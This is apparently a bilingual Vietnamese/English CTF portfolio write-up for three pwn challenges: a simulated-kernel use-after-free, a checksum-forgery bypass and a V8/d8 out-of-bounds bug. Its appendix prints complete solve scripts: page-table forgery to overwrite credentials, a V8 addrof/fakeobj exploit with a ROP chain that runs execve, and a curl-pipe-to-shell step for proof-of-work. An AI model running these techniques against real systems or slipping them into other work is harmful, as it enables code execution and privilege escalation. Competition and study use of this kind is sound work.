**Môi trường phân tích:** Kali Linux, Python 3, local `d8`, remote service `pwn.v1t.site:31339` hoặc `chall.v1t.site:31339`.  
**Công cụ sử dụng:** `strings`, Ghidra/IDA, gdb, JavaScript, Python socket.  
**Các bước thực hiện:**

1. Đọc `run.sh` để xác định cơ chế gửi exploit JS.
2. Đọc `readflag.c` để xác định mục tiêu là `execve('/readflag')`.
3. Tìm custom object `AcroForm` trong `d8`.
4. Khai thác bug `reset` + `resize` để tạo OOB.
5. Xây dựng primitive `addrof/fakeobj`, arbitrary read/write.
6. Leak địa chỉ, ghi ROP chain và chạy `/readflag`.

**Kết quả:** Exploit đạt native code execution trong d8 và gọi được helper đọc flag.  
**Kết luận:** Đây là bài pwn khó, yêu cầu hiểu V8 exploitation, JS heap primitive và ROP trên Linux.

---

# Tổng kết kỹ năng portfolio

## Phiên bản tiếng Việt

### Project/CTF Series: VBAFI/V1T Pwn Challenges

**Category:** Pwn / Binary Exploitation / Browser Exploitation  
**Objective:** Phân tích và khai thác ba challenge pwn gồm kernel-simulation UAF, record-graph integrity bypass và V8/d8 exploitation.  
**Tools Used:** Kali Linux, Docker, `file`, `strings`, `checksec`, Ghidra, gdb/pwndbg, Python, JavaScript.  
**Methodology:**

1. Nhận diện từng loại binary và môi trường chạy.
2. Phân tích menu, custom API và cơ chế đọc flag.
3. Reverse logic object lifecycle để tìm stale mapping/stale view/OOB.
4. Dựng primitive leak/write phù hợp từng bài.
5. Tự động hóa exploit bằng Python/JavaScript.
6. Xác minh kết quả bằng nhánh mở flag hoặc gọi helper `/readflag`.

**Key Findings:**

- `taleMate`: UAF/stale mapping trong pbuf ring cho phép forge PTE và sửa credential.
- `StaleMate - Revenge`: stale pipe view cho phép forge workspace mapping và sửa record checksums.
- `Acroform`: bug `AcroForm.reset()` + `resize()` tạo OOB primitive trong V8.

**Result:** Hoàn thiện exploit chain cho cả ba bài; flag remote cần điền từ output thật khi chạy script.  
**Skills Demonstrated:** Reverse engineering, exploit development, UAF analysis, page-table simulation exploitation, checksum reversing, V8 exploitation, ROP, Python automation.  
**Lessons Learned:** Các bài pwn hiện đại thường không chỉ là overflow đơn giản; cần hiểu sâu vòng đời object, allocator, integrity checks và cách nâng primitive thành tác động cuối cùng.

## Short English Version

**Project/CTF Series:** VBAFI/V1T Pwn Challenges  
**Category:** Pwn / Binary Exploitation / Browser Exploitation  
**Objective:** Analyze and exploit three pwn challenges involving kernel-simulation UAF, record integrity bypass, and V8/d8 exploitation.  
**Tools Used:** Kali Linux, Docker, `file`, `strings`, `checksec`, Ghidra, gdb, Python, JavaScript.  
**Methodology:** Identified runtime environments, reversed menu logic and custom APIs, found stale mapping/view and OOB bugs, built leak/write primitives, automated exploitation, and triggered flag-reading paths.  
**Key Findings:** The challenges required understanding object lifecycle bugs, page-table style mappings, checksum reconstruction, and V8 heap exploitation.  
**Result:** Completed exploit chains for all three challenges; remote flags should be filled from verified service output.  
**Skills Demonstrated:** Binary exploitation, reverse engineering, exploit scripting, V8 exploitation, ROP, debugging.

---

# Appendix - Exploit scripts

## A. `solve_talemate_v7.py`

```python
#!/usr/bin/env python3
import os, sys, socket, time, re, subprocess, platform, urllib.request, base64, struct

HOST = sys.argv[1] if len(sys.argv) > 1 else 'pwn.v1t.site'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 31337
DEBUG = '--debug' in sys.argv
NO_POW = '--no-pow' in sys.argv
SHELL_POW = '--shell-pow' in sys.argv

LEAK_RE = re.compile(rb"addr=0x([0-9a-fA-F]+)\s+len=0x([0-9a-fA-F]+)\s+bid=0x([0-9a-fA-F]+)\s+resv=0x([0-9a-fA-F]+)")
FLAG_RE = re.compile(rb"v1t\{[^}\r\n]+\}|V1T\{[^}\r\n]+\}|flag\{[^}\r\n]+\}")
POW_RE = re.compile(rb"sh\s+-s\s+([^\s\r\n]+).*?solution:\s*", re.S)
MENU_RE = re.compile(rb"(pbuf-remap|tiny io_uring|IORING_REGISTER|open flag|>\s*)", re.S)

class Tube:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=10)
        try:
            self.s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except Exception:
            pass
        self.s.settimeout(0.02)
        self.buf = b''
        self.closed = False

    def recv_some(self):
        try:
            d = self.s.recv(4096)
            if not d:
                self.closed = True
                return b''
            self.buf += d
            if DEBUG:
                sys.stdout.write(d.decode('latin-1', 'replace'))
                sys.stdout.flush()
            return d
        except (socket.timeout, TimeoutError):
            return None

    def wait_re(self, cre, sec=10):
        if isinstance(cre, (bytes, bytearray)):
            cre = re.compile(cre, re.S)
        end = time.time() + sec
        while time.time() < end and not self.closed:
            m = cre.search(self.buf)
            if m:
                return m
            self.recv_some()
        return None

    def read_for(self, sec):
        end = time.time() + sec
        start = len(self.buf)
        while time.time() < end and not self.closed:
            self.recv_some()
        return self.buf[start:]

    def sendline(self, x, delay=0.035):
        if isinstance(x, int):
            x = str(x)
        if isinstance(x, str):
            x = x.encode()
        if DEBUG:
            print(f"\n[SEND] {x.decode('latin-1','replace')}")
        self.s.sendall(x + b'\n')
        if delay:
            time.sleep(delay)

    def sendlines(self, xs, delay=0.035):
        for x in xs:
            self.sendline(x, delay=delay)


def cache_redpwnpow():
    sysname = platform.system().lower()
    machine = platform.machine().lower()
    if 'linux' in sysname:
        if machine in ('x86_64', 'amd64'):
            release = 'linux-amd64'
        elif machine in ('aarch64', 'arm64'):
            release = 'linux-arm64'
        elif machine.startswith('arm'):
            release = 'linux-armv6l'
        else:
            return None
    elif 'darwin' in sysname:
        release = 'darwin'
    elif 'windows' in sysname:
        release = 'windows-amd64.exe'
    else:
        return None
    version = 'v0.1.2'
    root = os.path.join(os.environ.get('XDG_CACHE_HOME', os.path.expanduser('~/.cache')), 'redpwnpow')
    os.makedirs(root, exist_ok=True)
    path = os.path.join(root, f'redpwnpow-{version}-{release}')
    if os.path.exists(path):
        return path
    url = f'https://github.com/redpwn/pow/releases/download/{version}/redpwnpow-{release}'
    print(f'[*] caching redpwnpow before connecting: {url}')
    urllib.request.urlretrieve(url, path)
    os.chmod(path, 0o755)
    return path


def verify_pow(chal, sol):
    # Fast local verification. This is not necessary for exploit, but catches broken/corrupt solver output.
    try:
        cp = chal.split('.', 2)
        sp = sol.split('.', 1)
        if len(cp) != 3 or len(sp) != 2 or cp[0] != 's' or sp[0] != 's':
            return False
        db = base64.b64decode(cp[1])
        db = b'\0' * (4 - len(db)) + db
        d = struct.unpack('>I', db)[0]
        x = int.from_bytes(base64.b64decode(cp[2]), 'big')
        y = int.from_bytes(base64.b64decode(sp[1]), 'big')
        mod = (1 << 1279) - 1
        for _ in range(d):
            y ^= 1
            y = pow(y, 2, mod)
        return y == x or y == (mod - x)
    except Exception:
        return False


def solve_token(token):
    if SHELL_POW:
        # Exact runner from the prompt. Slower only if binary is not cached yet.
        cmd = f"curl -sSfL https://pwn.red/pow | sh -s '{token}'"
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=180)
    else:
        exe = cache_redpwnpow()
        if exe:
            out = subprocess.check_output([exe, token], stderr=subprocess.STDOUT, timeout=180)
        else:
            cmd = f"curl -sSfL https://pwn.red/pow | sh -s '{token}'"
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=180)
    lines = [x.strip() for x in out.splitlines() if x.strip()]
    if not lines:
        raise RuntimeError('PoW solver returned empty output')
    return lines[-1].decode('ascii')


def handle_pow(r):
    if NO_POW:
        return
    # IMPORTANT: do not sleep here. Some PoW gates have a very short total timeout.
    m = r.wait_re(POW_RE, sec=8)
    if not m:
        # Maybe local/no-pow service; consume a tiny bit and continue.
        r.read_for(0.15)
        return
    prompt = r.buf.decode('latin-1', 'replace')
    print(prompt, end='' if prompt.endswith(' ') else '\n')
    token = m.group(1).decode('ascii')
    print(f'[*] token = {token}')
    t0 = time.time()
    sol = solve_token(token)
    dt = time.time() - t0
    print(f'[*] solved in {dt:.2f}s')

    # CRITICAL: send the PoW solution immediately.
    # Do NOT run local verify before sending; Python verification costs extra seconds
    # and this remote PoW gate appears to have a tight timeout.
    r.buf = b''
    r.sendline(sol, delay=0.0)
    print('[*] solution sent')

    # Optional verification AFTER sending only for debugging. It no longer delays PoW.
    if DEBUG:
        print(f'[*] local verify after send = {verify_pow(token, sol)}')

    # Accept either a printed menu or silent wait for input. Only fail if socket closes.
    got_menu = r.wait_re(MENU_RE, sec=3)
    if r.buf:
        print(r.buf.decode('latin-1', 'replace'), end='')
    if r.closed:
        raise RuntimeError('Remote closed right after PoW. PoW may still be rejected; run with --debug or try --shell-pow.')
    # If no menu, continue anyway; the binary may just be waiting for input.


def main():
    if not NO_POW and not SHELL_POW:
        try:
            cache_redpwnpow()
        except Exception as e:
            print(f'[!] warning: could not precache redpwnpow: {e}')
            print('[!] will try official curl runner after receiving token')

    r = Tube(HOST, PORT)
    handle_pow(r)

    # Phase 1: create stale pbuf mmap and leak encoded PTE[7]
    phase1 = [
        1, 1, 256, 1,   # register bgid=1 entries=256 flags=1 => one page pbuf ring
        2, 1,           # mmap bgid=1, mapped slot 0 points to pbuf page
        3, 1,           # unregister frees it, stale map remains
        6,              # create mm; freed page reused as page table
        5, 0, 3,        # inspect map 0 idx 3 => 16 bytes = PTE[6], PTE[7]
    ]
    r.sendlines(phase1, delay=0.035)
    m = r.wait_re(LEAK_RE, sec=6)
    if not m:
        r.read_for(1.0)
        raise RuntimeError('Could not find PTE leak. Output:\n' + r.buf.decode('latin-1','replace'))
    print(r.buf.decode('latin-1','replace'), end='')

    # Ring entry fields are 64-bit addr + 32-bit len + 16-bit bid + 16-bit resv.
    # We use idx=3, so addr leaks PTE[6], while len/bid/resv compose low/mid/high pieces of PTE[7].
    pte7 = int(m.group(2), 16) | (int(m.group(3), 16) << 32) | (int(m.group(4), 16) << 48)
    encoded_cred_pte = pte7 ^ ((3 ^ 1) << 12)  # same key/flags, PFN 3 -> PFN 1
    print(f'\n[+] leaked encoded PTE[7] = {pte7:#018x}')
    print(f'[+] encoded cred PTE     = {encoded_cred_pte:#018x}')

    # Phase 2: write forged PTE[8] through stale pbuf entry idx=4, then write into mapped cred page.
    # cred +0x08..+0x17 => uid/euid/gid fields = 0, cred +0x18..+0x1f => caps = -1.
    payload_hex = '00' * 16 + 'ff' * 8
    r.buf = b''
    phase2 = [
        4, 0, 4, str(encoded_cred_pte), 0, 0, 0,
        9, 0, str(0x8008), 24, payload_hex,
        10,
    ]
    r.sendlines(phase2, delay=0.035)
    r.read_for(3.0)
    out = r.buf.decode('latin-1', 'replace')
    print(out, end='')
    fm = FLAG_RE.search(r.buf)
    if fm:
        print('\n[+] FLAG:', fm.group(0).decode())
    else:
        print('\n[!] No flag regex found. If this is local Docker, fake/local flag may differ from remote.')

if __name__ == '__main__':
    main()

```

---

## B. `solve_stalemate_revenge.py`

```python
#!/usr/bin/env python3
import socket, subprocess, sys, time, re, struct, os, argparse

POW_RE = re.compile(rb"sh\s+-s\s+([^\s\r\n]+).*?solution:\s*", re.S)
MENU_RE = re.compile(rb"(relay-9 online|open pipe|claim record|>\s*)", re.S)

def cache_redpwnpow():
    import platform, urllib.request
    sysname = platform.system().lower()
    machine = platform.machine().lower()
    if 'linux' in sysname:
        if machine in ('x86_64', 'amd64'):
            release = 'linux-amd64'
        elif machine in ('aarch64', 'arm64'):
            release = 'linux-arm64'
        elif machine.startswith('arm'):
            release = 'linux-armv6l'
        else:
            return None
    elif 'darwin' in sysname:
        release = 'darwin'
    elif 'windows' in sysname:
        release = 'windows-amd64.exe'
    else:
        return None
    version = 'v0.1.2'
    root = os.path.join(os.environ.get('XDG_CACHE_HOME', os.path.expanduser('~/.cache')), 'redpwnpow')
    os.makedirs(root, exist_ok=True)
    path = os.path.join(root, f'redpwnpow-{version}-{release}')
    if os.path.exists(path):
        return path
    url = f'https://github.com/redpwn/pow/releases/download/{version}/redpwnpow-{release}'
    print(f'[*] caching redpwnpow: {url}', flush=True)
    urllib.request.urlretrieve(url, path)
    os.chmod(path, 0o755)
    return path

def solve_pow_token(token, shell_pow=False):
    if shell_pow:
        out = subprocess.check_output(f"curl -sSfL https://pwn.red/pow | sh -s '{token}'", shell=True, stderr=subprocess.STDOUT, timeout=180)
    else:
        exe = cache_redpwnpow()
        if exe:
            out = subprocess.check_output([exe, token], stderr=subprocess.STDOUT, timeout=180)
        else:
            out = subprocess.check_output(f"curl -sSfL https://pwn.red/pow | sh -s '{token}'", shell=True, stderr=subprocess.STDOUT, timeout=180)
    lines=[x.strip() for x in out.splitlines() if x.strip()]
    if not lines: raise RuntimeError('PoW solver returned empty output')
    return lines[-1].decode('ascii')

def handle_pow(r, shell_pow=False, no_pow=False):
    if no_pow:
        r.recv(0.2); return
    # Wait briefly for PoW prompt; local Docker usually has none.
    end=time.time()+8
    m=None
    while time.time()<end:
        r.recv(0.05)
        m=POW_RE.search(r.buf)
        if m: break
        if MENU_RE.search(r.buf): return
    if not m:
        return
    print(r.buf.decode('latin1','replace'), end='' if r.buf.endswith(b' ') else '\n', flush=True)
    token=m.group(1).decode('ascii')
    print(f'[*] token = {token}', flush=True)
    t=time.time(); sol=solve_pow_token(token, shell_pow=shell_pow)
    print(f'[*] solved in {time.time()-t:.2f}s', flush=True)
    r.buf=b''
    r.sendline(sol)
    print('[*] solution sent', flush=True)
    # Do not require printed menu; some wrappers go silent and wait for input.
    for _ in range(60):
        r.recv(0.05)
        if MENU_RE.search(r.buf): break

MASK=(1<<64)-1
C1=0xbf58476d1ce4e5b9; C2=0x94d049bb133111eb
INV1=pow(C1,-1,1<<64); INV2=pow(C2,-1,1<<64)
def rol(x,n): return ((x<<n)|(x>>(64-n)))&MASK
def ror(x,n): return ((x>>n)|(x<<(64-n)))&MASK
def mix(x):
    x&=MASK; x^=x>>30; x=x*C1&MASK; x^=x>>27; x=x*C2&MASK; x^=x>>31; return x&MASK
def unxorshr(y,k):
    x=y
    for s in range(k,64,k): x ^= y >> s
    return x&MASK
def unmix(y):
    x=unxorshr(y,31); x=x*INV2&MASK; x=unxorshr(x,27); x=x*INV1&MASK; x=unxorshr(x,30); return x&MASK
def q(b,o): return struct.unpack_from('<Q',b,o)[0]
def d(b,o): return struct.unpack_from('<I',b,o)[0]
def pq(x): return struct.pack('<Q',x&MASK)
def hashA(b): return mix(q(b,0)^q(b,0x10)^((d(b,0x20)<<32)&MASK)^rol(q(b,8),7)^rol(q(b,0x18),0x13)^d(b,0x24)^0x43514b3d9f2a1187)
def hashB(b): return mix(((d(b,0x20)<<32)&MASK)^q(b,0)^rol(q(b,8),5)^rol(q(b,0x10),0x11)^rol(q(b,0x18),0x1d)^d(b,0x24)^0x80d1f337a11c290b)
def hashC(b): return mix(q(b,0)^q(b,0x20)^((d(b,0x30)<<32)&MASK)^rol(q(b,8),3)^rol(q(b,0x10),0xd)^rol(q(b,0x18),0x17)^rol(q(b,0x28),0x1f)^d(b,0x34)^0x9b2c76a1570c4d35)
def hashD(b): return mix(((d(b,0x18)<<32)&MASK)^q(b,0)^rol(q(b,8),0xb)^ror(q(b,0x10),0x17)^d(b,0x1c)^0x321f0cc8c7a4b621)
def hashE(b): return mix(q(b,0)^q(b,0x10)^ror(q(b,0x20),0x1f)^rol(q(b,8),9)^rol(q(b,0x18),0x15)^0x6e34f88bd14a2039)
def final_hash(A,B,C,D,E): return mix(((d(D,0x18)<<7)&MASK)^q(E,0x10)^q(A,0x10)^d(C,0x30)^rol(q(E,0x20),0xf)^((d(B,0x20)<<32)&MASK)^0x43b8d13d98a22104)
def enc_pte(s1,s2,lvl,idx,pfn,flags):
    raw=((pfn&0xffffffff)<<12)|flags
    t=((idx<<5)&MASK) ^ flags ^ ((pfn&0xffffffff)<<17) ^ (lvl*4) ^ 0x2b992ddfa23249d6
    a=(((mix(t)<<4)&0xff0)|raw)&MASK
    mixA=mix(((lvl<<12)&MASK)^((idx<<32)&MASK)^0x4d0f1a2c77b90582)
    rot=(((7*idx)+((-lvl)&0xd))&0x1f)+9
    e0=rol((mixA+s1)&MASK,rot)^a
    mixB=mix(e0^((idx<<32)&MASK)^lvl^0xa6d9b3c81d0f77a9)
    e1=((s2+mixB+a)&MASK)^rol(s1,23)
    return e0&MASK,e1&MASK
class ProcIO:
    def __init__(self, argv):
        self.p=subprocess.Popen(argv,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
        os.set_blocking(self.p.stdout.fileno(),False); self.buf=b''
    def recv(self, t=0.05):
        end=time.time()+t
        while time.time()<end:
            try:
                c=os.read(self.p.stdout.fileno(),4096)
                if c: self.buf+=c
                else: break
            except BlockingIOError: pass
            time.sleep(0.005)
        return self.buf
    def sendline(self,x):
        if isinstance(x,int): x=str(x).encode()
        elif isinstance(x,str): x=x.encode()
        self.p.stdin.write(x+b'\n'); self.p.stdin.flush(); time.sleep(0.02); self.recv()
    def close(self): self.p.kill()
class SockIO:
    def __init__(self,host,port):
        self.s=socket.create_connection((host,int(port)),timeout=8); self.s.settimeout(0.15); self.buf=b''
    def recv(self,t=0.05):
        end=time.time()+t
        while time.time()<end:
            try:
                c=self.s.recv(4096)
                if not c: break
                self.buf+=c
            except socket.timeout: pass
            time.sleep(0.005)
        return self.buf
    def sendline(self,x):
        if isinstance(x,int): x=str(x).encode()
        elif isinstance(x,str): x=x.encode()
        self.s.sendall(x+b'\n'); time.sleep(0.02); self.recv()

def cmd(r,*xs):
    for x in xs: r.sendline(x)

def open_pipe(r,id,slots=64): cmd(r,1,id,slots)
def mirror(r,id):
    before=len(r.buf); cmd(r,2,id); out=r.buf[before:]
    m=re.search(rb'view=(\d+)',out)
    if not m: m=re.search(rb'view=(\d+)',r.buf)
    return int(m.group(1)) if m else None
def drop(r,id): cmd(r,3,id)
def trace(r,v,slot):
    before=len(r.buf); cmd(r,5,v,slot); out=r.buf[before:]
    m=list(re.finditer(rb'x=0x([0-9a-fA-F]+) y=0x([0-9a-fA-F]+)',out))
    if not m: m=list(re.finditer(rb'x=0x([0-9a-fA-F]+) y=0x([0-9a-fA-F]+)',r.buf))
    if not m: raise RuntimeError('trace parse failed: '+out.decode('latin1','replace'))
    return int(m[-1].group(1),16), int(m[-1].group(2),16)
def send_pkt(r,v,slot,x,y): cmd(r,4,v,slot,hex(x),hex(y))
def fetch(r,ws,addr,n):
    before=len(r.buf); cmd(r,8,ws,addr,n); out=r.buf[before:]
    # hex line: after "data:" or standalone hex
    cands=re.findall(rb'\b([0-9a-fA-F]{%d})\b'%(n*2), out)
    if not cands: cands=re.findall(rb'\b([0-9a-fA-F]{%d})\b'%(n*2), r.buf)
    if not cands: raise RuntimeError('fetch parse failed: '+out.decode('latin1','replace'))
    return bytes.fromhex(cands[-1].decode())
def store(r,ws,addr,data): cmd(r,9,ws,addr,len(data),data.hex())

def exploit(r):
    r.recv(0.2)
    shelf=5
    # stale view to second-level page
    cmd(r,6)              # ws=0 root pfn 23
    open_pipe(r,101,64)   # alloc pfn24
    vsec=mirror(r,101); drop(r,101)
    cmd(r,7,0,shelf)      # attach shelf -> reuse pfn24 as L2 page
    # stale view to sync/ledger page
    open_pipe(r,102,64)   # alloc pfn25
    vled=mirror(r,102); drop(r,102)
    cmd(r,10,0)           # sync -> reuse pfn25 as ledger page
    if vsec is None: vsec=0
    if vled is None: vled=1
    l0,l1=trace(r,vled,0)
    l20,l28=trace(r,vled,2)
    rcx=l0; old_pfn=24  # deterministic from allocation plan
    s2=ror(l28 ^ mix(0x62a9d9ed6c8f0023 ^ rcx),31)
    s1=unmix(rcx) ^ (old_pfn<<17) ^ rol(s2,9) ^ 0x88f9a9e51fbbaeed
    print(f'[+] secrets s1={s1:#x} s2={s2:#x}')
    # forge mappings idx == pfn for pfns 8..12
    for pfn in range(8,13):
        e0,e1=enc_pte(s1,s2,1,pfn,pfn,7)
        send_pkt(r,vsec,pfn,e0,e1)
    def va(pfn,off): return (shelf<<20)|(pfn<<12)|off
    A=bytearray(fetch(r,0,va(8,0x120),0x30))
    B=bytearray(fetch(r,0,va(9,0x260),0x30))
    C=bytearray(fetch(r,0,va(10,0x90),0x40))
    D=bytearray(fetch(r,0,va(11,0x330),0x28))
    E=bytearray(fetch(r,0,va(12,0x1d0),0x30))
    print('[+] hash check', hashA(A)==q(A,0x28), hashB(B)==q(B,0x28), hashC(C)==q(C,0x38), hashD(D)==q(D,0x20), hashE(E)==q(E,0x28))
    C[0x20:0x28]=pq(q(C,0x20)|0x40002004081)
    E[0x10:0x18]=pq(q(E,0x10)|0x8000000000002491)
    C[0x38:0x40]=pq(hashC(C))
    E[0x28:0x30]=pq(hashE(E))
    A[0x18:0x20]=pq(final_hash(A,B,C,D,E))
    A[0x28:0x30]=pq(hashA(A))
    store(r,0,va(10,0x90+0x20),C[0x20:0x28])
    store(r,0,va(10,0x90+0x38),C[0x38:0x40])
    store(r,0,va(12,0x1d0+0x10),E[0x10:0x18])
    store(r,0,va(12,0x1d0+0x28),E[0x28:0x30])
    store(r,0,va(8,0x120+0x18),A[0x18:0x20])
    store(r,0,va(8,0x120+0x28),A[0x28:0x30])
    before=len(r.buf); cmd(r,13); r.recv(0.5)
    print(r.buf[before:].decode('latin1','replace'))

if __name__=='__main__':
    ap=argparse.ArgumentParser(description='Exploit for StaleMate - Revenge')
    ap.add_argument('host', nargs='?', default=None)
    ap.add_argument('port', nargs='?', type=int, default=31338)
    ap.add_argument('--local', action='store_true', help='run /tmp/service locally')
    ap.add_argument('--bin', default='/tmp/service', help='local service path')
    ap.add_argument('--no-pow', action='store_true')
    ap.add_argument('--shell-pow', action='store_true')
    args=ap.parse_args()
    if args.local or args.host is None:
        r=ProcIO([args.bin])
    else:
        r=SockIO(args.host,args.port)
        handle_pow(r, shell_pow=args.shell_pow, no_pow=args.no_pow)
    exploit(r)

```

---

## C. `solve_acroform.py`

```python
#!/usr/bin/env python3
import socket, sys, re, subprocess, time, argparse, os

EXPLOIT_JS = r'''
let ab=new ArrayBuffer(8), f64=new Float64Array(ab), u64=new BigUint64Array(ab);
function ftoi(x){f64[0]=x;return u64[0];}
function itof(x){u64[0]=x;return f64[0];}
function hex(x){return '0x'+x.toString(16);}function packstr(s){let arr=[];for(let i=0;i<s.length;i+=8){let q=0n;for(let j=0;j<8;j++){let c=(i+j<s.length)?s.charCodeAt(i+j):0;q|=BigInt(c)<<(8n*BigInt(j));}arr.push(q);}return arr;}
let sink=[];function leakArr(k,l){let A=new AcroForm();A.resize(8);let arr=new Array(l);if(k==0){for(let i=0;i<l;i++)arr[i]={x:i};}else{for(let i=0;i<l;i++)arr[i]=13.37+i;}sink.push(arr);let qs=[];try{A.reset(function(i,v){if(i==0)A.resize(11);if(i>=8&&i<11){qs.push(ftoi(v));if(i<10)return v;throw'x';}return undefined;});}catch(e){}return[arr,qs];}
let objMap=leakArr(0,1)[1][0],dblMap=leakArr(1,2)[1][0];function corr(k,m,e){let A=new AcroForm();A.resize(8);let arr=new Array(1);if(k==0)arr[0]=e;else arr[0]=1.1;sink.push(arr);try{A.reset(function(i,v){if(i==0)A.resize(9);if(i==8)return itof(m);return undefined;});}catch(e){}return arr;}function addrof(o){return ftoi(corr(0,dblMap,o)[0])&0xffffffffn;}function fakeobj(a){let arr=corr(1,objMap,1.1);arr[0]=itof(a);return arr[0];}let[space,sq]=leakArr(1,10);let spaceElem=sq[1]&0xffffffffn;space[0]=itof(dblMap);let fake=fakeobj((spaceElem+8n)&0xffffffffn);function setElems(e,l=0x100n){space[1]=itof((e&0xffffffffn)|(l<<32n));}function arbRead(p,o){setElems((p+BigInt(o)-8n)&0xffffffffn);return ftoi(fake[0]);}function arbWrite(p,o,val){setElems((p+BigInt(o)-8n)&0xffffffffn);fake[0]=itof(val);}
let mem=new AcroForm();mem.calcAlloc(1);let memAddr=addrof(mem);function nread64(addr){arbWrite(memAddr,88,addr);let out=new Float64Array(1);mem.calcLoad(out);return ftoi(out[0]);}function nwrite64(addr,val){let a=new Float64Array(1);a[0]=itof(val);arbWrite(memAddr,88,addr);mem.calcStore(a);}
let holder=new AcroForm();holder.calcAlloc(0x200);let holderAddr=addrof(holder);let buf=arbRead(holderAddr,88);
let leak=nread64(buf-8n);let base=leak-0x1e9fcd0n;
let stackVar=nread64(base+0x1f01e20n);let stackEnd=nread64(stackVar);
let pop_rdi=base+0x5e2c67n, pop_rsi=base+0x83b21en, pop_rdx=base+0x7054a6n, pop_rax=base+0x5c2c6bn, syscall=base+0x81c58fn;
let str=buf+0x400n;let argv=buf+0x480n;for(let [i,q] of packstr('/readflag\x00').entries()) nwrite64(str+8n*BigInt(i),q);nwrite64(argv,str);nwrite64(argv+8n,0n);
let chain=[pop_rdi,str,pop_rsi,argv,pop_rdx,0n,pop_rax,59n,syscall];
let targetOffs=[0x5ec8b6n,0x5ec537n,0x5ee2fdn];
let found=0n;
for (let ti=0; ti<targetOffs.length && found==0n; ti++){
  let targetOff=targetOffs[ti];
  for(let a=stackEnd-0x40000n;a<stackEnd;a+=8n){
    let q=nread64(a);
    if(q==base+targetOff){
      for(let i=0;i<chain.length;i++) nwrite64(a+8n*BigInt(i),chain[i]);
      found=1n;
      break;
    }
  }
}
'''

def recv_some(s, timeout=1.0):
    s.settimeout(timeout)
    data=b''
    try:
        while True:
            chunk=s.recv(4096)
            if not chunk: break
            data+=chunk
            if len(chunk)<4096: break
    except socket.timeout:
        pass
    return data

def solve_pow_if_needed(s, data):
    text=data.decode('latin-1','replace')
    if 'proof of work' not in text and 'pwn.red/pow' not in text:
        return data
    sys.stdout.write(text); sys.stdout.flush()
    m=re.search(r'sh -s\s+([^\s\r\n]+)', text)
    if not m:
        more=recv_some(s,2.0); text+=more.decode('latin-1','replace'); sys.stdout.write(more.decode('latin-1','replace')); sys.stdout.flush(); m=re.search(r'sh -s\s+([^\s\r\n]+)', text)
    if not m: raise RuntimeError('PoW token not found')
    token=m.group(1)
    print(f'[*] solving PoW token: {token}', flush=True)
    sol=subprocess.check_output(['bash','-lc',f'curl -sSfL https://pwn.red/pow | sh -s {token}'], timeout=20).strip()
    print(f'[*] PoW solved ({len(sol)} bytes), sending...', flush=True)
    s.sendall(sol+b'\n')
    return recv_some(s,2.0)

def main():
    ap=argparse.ArgumentParser()
    ap.add_argument('host', nargs='?', default='pwn.v1t.site')
    ap.add_argument('port', nargs='?', type=int, default=31339)
    args=ap.parse_args()
    s=socket.create_connection((args.host,args.port),timeout=10)
    data=recv_some(s,2.0)
    data=solve_pow_if_needed(s,data)
    if data:
        sys.stdout.write(data.decode('latin-1','replace')); sys.stdout.flush()
    # send exploit and EOF; run.sh uses head until EOF
    s.sendall(EXPLOIT_JS.encode()+b'\n')
    try:
        s.shutdown(socket.SHUT_WR)
    except OSError:
        pass
    while True:
        chunk=s.recv(4096)
        if not chunk: break
        sys.stdout.write(chunk.decode('latin-1','replace')); sys.stdout.flush()

if __name__=='__main__':
    main()

```

---

# Checklist trước khi nộp portfolio

- [ ] Chạy lại từng exploit trên remote.
- [ ] Copy flag thật `v1t{...}` vào mục `FLAG tìm được` của từng bài.
- [ ] Xóa hoặc ghi chú rõ các fake flag local.
- [ ] Chèn ảnh minh chứng nếu cần: output `file`, `strings`, menu challenge, exploit chạy thành công.
- [ ] Kiểm tra không có API key/token cá nhân trong script.
- [ ] Nếu public GitHub, chỉ đăng write-up sau khi CTF kết thúc hoặc theo rule của ban tổ chức.
